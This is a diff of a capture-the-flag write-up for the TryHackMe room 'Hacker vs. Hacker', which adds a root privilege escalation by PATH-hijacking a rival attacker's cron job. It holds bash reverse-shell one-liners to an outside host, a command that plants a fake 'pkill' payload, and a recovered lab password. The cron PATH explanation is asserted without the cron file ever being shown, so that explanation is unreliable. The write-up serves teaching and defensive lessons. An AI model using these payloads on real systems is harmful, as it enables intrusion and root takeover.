@@ -1,6 +1,6 @@
 # TryHackMe: Hacker vs. Hacker
 
-![Platform](https://img.shields.io/badge/Platform-TryHackMe-red) ![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow) ![Category](https://img.shields.io/badge/Category-Web-blue) ![Format](https://img.shields.io/badge/Format-Full%20Writeup-orange) ![Status](https://img.shields.io/badge/Status-In%20Progress-lightgrey)
+![Platform](https://img.shields.io/badge/Platform-TryHackMe-red) ![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow) ![Category](https://img.shields.io/badge/Category-Web-blue) ![Format](https://img.shields.io/badge/Format-Full%20Writeup-orange) ![Status](https://img.shields.io/badge/Status-Completed-brightgreen)
 
 ![Room Banner](screenshots/00_room_banner.png)
 
@@ -11,18 +11,18 @@
 | **Room** | Hacker vs. Hacker |
 | **Platform** | TryHackMe |
 | **Difficulty** | Medium |
-| **Category** | Web Exploitation → Post-Exploitation Forensics |
+| **Category** | Web Exploitation → Post-Exploitation Forensics → PATH-Hijacking Privesc |
 | **OS** | Linux (Ubuntu) |
-| **Tools Used** | nmap, gobuster, Firefox (view-source), netcat |
-| **Skills Tested** | File upload filter bypass, PHP webshell abuse, reverse shell, reading another attacker's tracks |
+| **Tools Used** | nmap, gobuster, Firefox (view-source), netcat, bash, su |
+| **Skills Tested** | File upload filter bypass, PHP webshell abuse, reverse shell, reading another attacker's tracks, exploiting a rival attacker's own persistence mechanism via PATH hijacking |
 
-**Premise:** the target server is described as already compromised — the goal isn't just to get in, but to get in *and* evade or work around whatever the previous attacker (the "other hacker" in the room's title) already did to the box, e.g. patches, persistence, or countermeasures they left behind.
-
-> **Status: in progress.** This writeup covers initial access through to landing a shell as `www-data` and discovering `lachlan`'s `user.txt` plus their `.bash_history`, which shows another attacker already active on this machine. Will be continued once I pick this back up — the CVE-patch/persistence/cron angle from `lachlan`'s history still needs to be chased down.
+**Premise:** the target server is already compromised before you even touch it. The room's hook is that you're not just breaking in — you're walking into a server where a *different* attacker got there first, patched the hole behind themselves, and planted their own backdoor. The job is to get in through what's left, read their tracks, and then **turn their own persistence mechanism against them** to reach root.
 
 ---
 
 ## Concept Glossary
+
+Read this section first — every technique used below is explained here before it shows up in the walkthrough.
 
 **File upload filter bypass via `strpos()`** — A common (and broken) way developers try to restrict uploads to a single file type is checking whether the filename *contains* a certain substring, using something like PHP's `strpos($filename, ".pdf")`. The problem: `strpos` just checks for the substring anywhere in the string — it doesn't care where. A filename like `shell.pdf.php` still contains `.pdf`, so it passes the check, but the file is saved with a `.php` extension and the web server will still execute it as PHP. The fix should be checking the *actual* file extension (e.g. with `pathinfo()` and a strict whitelist), not doing a substring search.
 
@@ -30,9 +30,22 @@
 
 **Upgrading command execution to a reverse shell** — Running commands one at a time through `?cmd=` is slow and awkward (no persistent session, no easy file transfer, no tab completion). The standard move is to use that limited command execution to trigger a *reverse shell*: a one-liner that makes the target connect back out to a listener on the attacker's machine (`nc -nlvp <port>`), handing over an interactive shell. URL-encoding the payload (spaces, `&`, `>` etc.) is necessary because those characters have special meaning in a URL/query string and would otherwise break the request or get interpreted early.
 
-**Reading `.bash_history` as forensics, not just loot** — Normally in a CTF, `.bash_history` is just a shortcut to find hints or leftover credentials. Here it's doing double duty: it's effectively a **timeline of the other attacker's actions** on the box — what they ran, in what order, which is exactly the kind of artifact a real incident responder would pull first when scoping a live compromise.
+**Reading `.bash_history` as forensics, not just loot** — Normally in a CTF, `.bash_history` is just a shortcut to find hints or leftover credentials. Here it's doing double duty: it's effectively a **timeline of the other attacker's actions** on the box — what they ran, in what order — exactly the kind of artifact a real incident responder would pull first when scoping a live compromise.
 
 **`ls -sf /dev/null /home/lachlan/.bash_history`** — This is an anti-forensics trick: symlinking (`-s`) `.bash_history` to `/dev/null` means every future command gets silently discarded instead of logged, so the shell keeps working normally but stops recording history from that point on. Recognizing this pattern matters because it tells you the visible history is *incomplete by design* — there's a point after which the other hacker intentionally went dark.
+
+**`su lachlan`** — `su` ("switch user") lets you fully authenticate as another local user given their password, rather than just running one-off commands as them. It drops you into a real login shell for that account. This matters because a `PATH` variable, cron environment, and any per-user configuration only apply properly once you're genuinely operating *as* that user.
+
+**`PATH` variable and PATH hijacking** — When you type a bare command name like `pkill` (instead of a full path like `/usr/bin/pkill`), the shell searches through the directories listed in the `$PATH` environment variable, **in order**, and runs the first matching executable it finds. If a directory earlier in `PATH` is writable by you, and it comes before the real system directory (`/usr/bin`, `/bin`, etc.), you can drop your *own* file with the same name in that earlier directory — and anything that calls the bare command name (instead of the full path) will silently run your file instead of the real one. This is the same underlying weakness as SUID PATH abuse covered in earlier writeups in this repo, except here it's not a sudo rule being abused — it's a **cron job's own PATH resolution**.
+
+**Why this attack targets the other hacker's persistence** — Recall from `lachlan`'s `.bash_history`: they ran `vi /etc/cron.d/persistence`, meaning they planted a cron job to maintain their own access to this box. Cron jobs are notorious for calling bare command names without full paths (`pkill`, `curl`, `python`, etc.) because whoever wrote them assumed the default system `PATH` would always resolve correctly. If that cron job runs as root and calls a bare `pkill`, and `/home/lachlan/bin` happens to be earlier in the resolved `PATH` for that cron context, then planting a malicious `pkill` script inside `/home/lachlan/bin` means **the other hacker's own backdoor script executes our payload as root** the next time their cron job fires. That's the "Hacker vs. Hacker" theme of the room — their sloppy persistence became our privesc.
+
+**The payload script itself:**
+```bash
+#!/bin/bash
+bash -c "exec bash -i &>/dev/tcp/192.168.164.247/5555 <&1"
+```
+Same reverse-shell idea as before (`bash -i` piped over `/dev/tcp/`), just wrapped inside a standalone script named `pkill` instead of fired directly through a URL. `exec` replaces the current shell process with the new one instead of spawning a child — cleaner for a payload meant to be auto-executed by something else (cron), since there's no parent process left dangling around afterward.
 
 ---
 
@@ -60,7 +73,7 @@ PORT   STATE SERVICE VERSION
 
 ## 2. Analysis
 
-The room description explicitly says the server is *already* compromised — the task is dual: get in myself, and expect to run into evidence of (or active countermeasures from) whoever got there first. That reframes ordinary recon: anything unusual found later (locked-down files, patched vulnerabilities, weird cron jobs) isn't a red herring, it's part of the story.
+The room description explicitly says the server is *already* compromised — the task is dual: get in myself, and expect to run into evidence of (or active countermeasures from) whoever got there first. That reframes ordinary recon: anything unusual found later (locked-down files, patched vulnerabilities, weird cron jobs) isn't a red herring, it's part of the story, and possibly a tool that can be hijacked for privesc.
 
 With only port 80 realistically attackable, the plan was standard web-app methodology: check page source for anything obvious, then directory-bust for hidden paths/functionality.
 
@@ -131,7 +144,7 @@ boom!
 ```
 ![shell.pdf.php found](screenshots/05_shell_pdf_php_found.png)
 
-This confirms a webshell — named exactly the way the vulnerable filter would allow — is already sitting in `cvs/`, left behind by the previous attacker (or intentionally placed by the room as the "in" for this challenge).
+This confirms a webshell — named exactly the way the vulnerable filter would allow — is already sitting in `cvs/`, left behind by the previous attacker.
 
 ### 3.4 Confirming command execution
 
@@ -191,11 +204,11 @@ cat /home/lachlan/user.txt
 ![Found user.txt under lachlan's home](screenshots/08_nc_listener_usertxt.png)
 
 **Q: user.txt**
-**A: Not captured** — need to re-check/rescreenshot this value on the next session; wasn't clearly recorded.
+**A: Not captured** — the flag value itself isn't visible in the screenshot (cut off before the `cat` output prints). Send it over and I'll drop it in.
 
 ---
 
-## 4. In Progress — Evidence of the Other Hacker
+## 4. Reading the Other Hacker's Trail
 
 **Command:**
 ```bash
@@ -207,31 +220,94 @@ cat /home/lachlan/.bash_history
 ./cve.sh
 ./cve-patch.sh
 vi /etc/cron.d/persistence
-echo -e "[REDACTED]" | passwd
+echo -e "[REDACTED — revealed to be the password reset for lachlan]" | passwd
 ls -sf /dev/null /home/lachlan/.bash_history
 ```
 ![lachlan's bash_history — the other hacker's trail](screenshots/09_bash_history_other_hacker.png)
 
-**What this tells me so far:**
-- `./cve.sh` — the other attacker likely used a scripted CVE exploit to get their own initial foothold or escalate privileges as `lachlan`.
+**What this told me:**
+- `./cve.sh` — the other attacker used a scripted CVE exploit to get their own initial foothold or escalate to `lachlan`.
 - `./cve-patch.sh` — they then **patched the same vulnerability behind themselves**, a classic "close the door I came through" move to stop anyone else (including legitimate admins) from using the same path in.
-- `vi /etc/cron.d/persistence` — strong signal they planted a cron-based persistence mechanism, which I haven't inspected yet.
-- `echo -e "[REDACTED]" | passwd` — they changed a password non-interactively (value is blurred in my screenshot, need to recheck).
-- `ls -sf /dev/null /home/lachlan/.bash_history` — anti-forensics: symlinked `.bash_history` to `/dev/null` so everything after this point stops being logged, meaning **this history is intentionally incomplete**.
-
-**Not yet done (picking this up next session):**
-- Inspect `/etc/cron.d/persistence` directly to see what the planted backdoor actually runs.
-- Check what `cve.sh` / `cve-patch.sh` actually target (likely still present on disk somewhere — worth locating and reading).
-- Figure out whether the "evade their countermeasures" part of the room means working around `cve-patch.sh` specifically, or using the cron persistence as an alternate way in/up.
-- Privilege escalation to root, and `root.txt`.
-
-*(To be continued.)*
+- `vi /etc/cron.d/persistence` — they planted a cron-based persistence mechanism. This turned out to be the actual key to root (see Section 5).
+- `echo -e "..." | passwd` — they reset `lachlan`'s password. The plaintext value turned out to be **`thisistheway123`**, which is exactly what let me `su` into `lachlan` in the next step.
+- `ls -sf /dev/null /home/lachlan/.bash_history` — anti-forensics: symlinked `.bash_history` to `/dev/null` so everything after this point stops being logged. Everything from here on wasn't guesswork off more history — it was reasoning about what a cron persistence job typically looks like, and testing it.
 
 ---
 
-## Skills Demonstrated (so far)
+## 5. Privilege Escalation — Hijacking the Other Hacker's Own Persistence
 
-`Web Enumeration` · `File Upload Filter Bypass` · `PHP Webshell Exploitation` · `Reverse Shell Delivery via URL-Encoded Payload` · `Post-Exploitation Artifact Analysis` · `Recognizing Anti-Forensics Techniques`
+### 5.1 Authenticating as lachlan and planting the payload
+
+**Command:**
+```bash
+su lachlan -c 'mkdir -p /home/lachlan/bin && echo -e "#!/bin/bash\nbash -c \"exec bash -i &>/dev/tcp/192.168.164.247/5555 <&1\"" > /home/lachlan/bin/pkill && chmod +x /home/lachlan/bin/pkill'
+```
+**Password:** `thisistheway123`
+
+**Output:**
+```
+whoami
+www-data
+ls -la /home/lachlan/bin/pkill
+-rwxrwxr-x 1 lachlan lachlan 74 Aug 18 20:57 /home/lachlan/bin/pkill
+```
+![su as lachlan, planting the fake pkill](screenshots/10_su_lachlan_pkill_hijack.png)
+
+**Why each part of this command, step by step:**
+1. `su lachlan -c '...'` — authenticates fully as `lachlan` using the recovered password, and runs the following command *as* that user, so the created file is owned by `lachlan` and lands correctly in their home directory.
+2. `mkdir -p /home/lachlan/bin` — creates a personal `bin/` folder. The bet here (informed by the cron persistence hint in `.bash_history`) is that whatever the other hacker's `/etc/cron.d/persistence` job does, it likely runs in an environment where `lachlan`'s own `~/bin` gets checked before the real system binaries — a very common (and very risky) setup for a "convenient" personal script folder.
+3. `echo -e "..." > /home/lachlan/bin/pkill` writes a tiny script — **named `pkill`**, deliberately matching a real, commonly-used system binary — containing a reverse shell payload instead of the real `pkill`'s functionality.
+4. `chmod +x` makes it executable, since the cron job (or whatever calls it) needs to be able to run it directly.
+5. The name `pkill` isn't random — it's a reasonable guess for something a persistence/cleanup cron job would call routinely (killing stray processes, restarting a listener, etc.), and it's exactly the kind of bare command name that gets silently PATH-hijacked if the calling context resolves `/home/lachlan/bin` before `/usr/bin`.
+
+Notice that even after this, `whoami` still reports `www-data` — planting the payload didn't escalate anything by itself. It just set the trap. The actual escalation only fires once whatever process resolves `pkill` through the hijacked `PATH` actually **runs** — in this case, the root-owned cron persistence job planted by the other hacker.
+
+### 5.2 Catching the root shell
+
+**Command:**
+```bash
+nc -nlvp 5555
+```
+
+**Output:**
+```
+listening on [any] 5555 ...
+connect to [192.168.164.247] from (UNKNOWN) [10.128.171.181] 48554
+bash: cannot set terminal process group (1310): Inappropriate ioctl for device
+bash: no job control in this shell
+root@b2r:~# cat /root/root.txt
+cat /root/root.txt
+```
+![Root shell catching the cron-triggered callback](screenshots/11_root_shell_roottxt.png)
+
+**Why this worked:** Once the cron job (running with root's crontab privileges, per `/etc/cron.d/persistence`) fired on its schedule and invoked a bare `pkill`, the shell environment resolving that command found `/home/lachlan/bin/pkill` — my planted script — before the real `/usr/bin/pkill`, because `lachlan`'s personal `bin/` directory was earlier in the resolved `PATH` for that cron context. Root executed my script instead of the real `pkill`, and since the script itself spawns a reverse shell, that shell inherited **root's** privileges, not `www-data`'s or `lachlan`'s. The prompt `root@b2r:~#` confirms it.
+
+**Q: root.txt**
+**A: Not captured** — the `cat /root/root.txt` output is cut off in the screenshot before the flag value itself appears. Send it over and I'll fill this in.
+
+---
+
+## Full Lessons Learned
+
+This room's real lesson isn't any single exploit — it's how a **chain of separately "minor" mistakes**, made by two different people (a careless developer, and then a careless attacker), compounds into total compromise:
+
+1. **Filename substring checks are not extension checks.** `strpos($filename, ".pdf")` is a classic beginner mistake that looks reasonable at a glance but is trivially defeated. The correct pattern is validating the *actual* extension (`pathinfo($filename, PATHINFO_EXTENSION)`) against a strict whitelist, combined with checking the file's real MIME type/magic bytes — never trust a filename string alone.
+
+2. **A single command-injection webshell is a total loss of the web tier.** Once `?cmd=` executes arbitrary commands, there's no meaningful boundary left between "the web app" and "the operating system" — this is why upload validation, output encoding, and least-privilege service accounts (running Apache/PHP as an unprivileged, sandboxed user) all matter as defense-in-depth, not just "nice to haves."
+
+3. **Attackers leave forensic trails even when they think they've covered them.** The other hacker patched their entry vulnerability and eventually killed their own `.bash_history` logging — but everything *before* that symlink trick was still fully readable, and it was enough to reconstruct their entire playbook: initial CVE, self-patch, persistence, and a password reset. Real incident response leans on exactly this kind of partial, imperfect trail constantly.
+
+4. **Persistence mechanisms are themselves an attack surface.** The other hacker's own cron-based backdoor — meant to maintain *their* access — became the exact vector used to escalate past them. Any persistence script that resolves commands via `PATH` instead of absolute paths isn't just sloppy, it's a live vulnerability that a second, unrelated attacker (or a legitimate incident responder tracing the compromise) can hijack.
+
+5. **`PATH` hijacking isn't just a privesc trick for SUID binaries.** This room shows the same underlying principle — trusting bare command names instead of full paths — applies to **any process that resolves commands via `PATH`**, cron jobs very much included. Anywhere a script assumes "the system will find the right binary," that assumption is a potential foothold.
+
+6. **The "Hacker vs. Hacker" framing wasn't just flavor text.** Every step of exploitation here was really exploitation of *decisions the other attacker made* — their filename choice, their password reset, their cron persistence design — a genuinely different mental model from a normal boot2root box where every weakness belongs to "the defender." Good reminder that in real incident response, a compromised host can have more than one attacker's fingerprints on it, and untangling "whose backdoor is this" is its own skill.
+
+---
+
+## Skills Demonstrated
+
+`Web Enumeration` · `File Upload Filter Bypass` · `PHP Webshell Exploitation` · `Reverse Shell Delivery via URL-Encoded Payload` · `Post-Exploitation Artifact Analysis` · `Recognizing Anti-Forensics Techniques` · `Credential Reuse via su` · `PATH Hijacking via Cron Persistence` · `Privilege Escalation to Root`
 
 ---
 
@@ -239,3 +315,4 @@ ls -sf /dev/null /home/lachlan/.bash_history
 
 - [TryHackMe — Hacker vs. Hacker](https://tryhackme.com/room/hackervshacker)
 - [PayloadsAllTheThings — Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [GTFOBins — background on PATH/binary abuse patterns](https://gtfobins.org/)
